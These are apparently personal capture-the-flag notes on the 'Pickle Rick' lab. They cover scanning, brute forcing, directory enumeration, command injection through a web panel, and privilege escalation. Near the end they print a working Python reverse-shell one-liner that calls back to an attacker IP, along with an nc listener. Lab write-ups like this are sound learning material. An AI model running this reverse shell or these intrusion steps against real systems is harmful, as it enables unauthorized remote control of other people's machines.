export IP=10.10.106.160

# tool - nmap: 
 - nmap -sV -sC -oN nmap/initial $IP

# open ports
 - 20
 - 80

# website details
 - username from source code: R1ckRul3s

# tool - dirsearch
 - directory: assets

# tool - hydra
 - hydra -l R1ckRul3s -P /usr/share/wordlists/metasploit/password.lst ssh://$ip
    - No output as the server doesnt support password authentication

# tool - gobuster
 - gobuster dir -t 100 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -x php,txt,html -u http://$ip
    - detected files which includes login.php and robots.txt

# tool - linPEAS
 - Run linpeas script after obtaining reverse shell. This will show that the current user can run sudo su and go to root dir

# process
 - Got "Wubbalubbadubdub" from robots.txt
 - tried to login using the username from website source and this above string as password and got it.
 - The logged in page as many tabs and the tab with the name commands panel lets you run commands
 - Ran `ls` and it listed all the files available inside the directory which included index.html
    - `Sup3rS3cretPickl3Ingred.txt` was one among the files listed
    - `clue.txt` - asked to look around the filesystem
 - So tried accessing the url `http://10.10.106.160/Sup3rS3cretPickl3Ingred.txt` and got the first ingredient
 - Tried to list the dirs inside the home directory which showed there is a rick user home dir, there was a file inside it.
 - The cat command was not working as the output said, this command is disabled, so tried using grep "" <filename> which got me the second answer.
    - `cd ../../../home/rick && grep "" a.txt`
    - Use grep -R command to get the contents of all the files, including PHP files at once. This will be useful because contents of PHP files will show you the application logic
    - Another way is to use bash scripting, to echo lines using while. 
 - There is a base64 looking string inside the portal.php page which is accessible after logging in. This base64 string is encoded multiple times using base64, so we have to decode it multiple times to get the string.
    -  `echo "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d` which returns the string `rabbit hole`. This is not useful in the CTF.
 - Considering we can run commands, we can start a reverse shell to navigate through the os file system. For this check if python or python3 --version to see if it works. Or use any scripting language for that matter. Once confirmed, goto pentest monkey's reverse shell cheatsheet to get a onliner to start the reverse shell. Run `nc` locally before submitting the reverseshell command to get connected.
    - `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.25.169",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
    - `nc -lv -p 1234`
    - Run linpeas and get information
    - Change dir to roots home dir and you will see another file with the phrase `fleeb juice` which is the 3rd ingradient.